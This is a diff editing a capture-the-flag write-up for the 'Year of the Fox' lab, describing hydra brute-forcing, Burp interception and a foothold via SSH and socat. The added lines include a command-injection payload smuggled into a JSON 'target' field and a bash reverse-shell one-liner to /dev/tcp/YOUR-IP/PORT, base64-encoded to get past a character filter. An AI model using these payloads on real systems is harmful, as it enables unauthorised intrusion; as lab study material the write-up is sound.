@@ -57,18 +57,19 @@ Use hydra to bruteforce web login. It works with user rascal but the password ch
 The website:
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20160130.png)
 
-Search an empty string and you have 3 files:
+Search an empty string and you can see the expected input is files. Also , seems like it doesn't like some characters.
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20160520.png)
 
 Intercepting request with Burp:
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20163302.png)
 
-For RCE:
+Now , I used intruder to launch a simple SQL injection fuzzing but got nothing. So now onto command injection. You can run some commands using : `{"target":"\"; COMMAND \""}`
+Used RCE Command : `bash -i >& /dev/tcp/YOUR-IP/PORT 0>&1` but got invalid-character response so used base 64.
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20194847.png)
 
-Use burp reppeater:
+Use burp repeater:
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20194710.png)
 
@@ -77,11 +78,12 @@ We gain an RCE:
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20195039.png)
 
 And there we get our first flag!
-Check all processes which aree running:
+## FOOTHOLD
+Check all processes which are running:
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20195224.png)
 
-There seems to be a process running on port 22. It turns out be SSH and can be confirmed in /etc/ssh/sshd_config file 
+There seems to be SSH running on port 22 and can be confirmed in `/etc/ssh/sshd_config` file which also tells us that only user fox can use it. We can use this.
 Use socat:
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20195606.png)
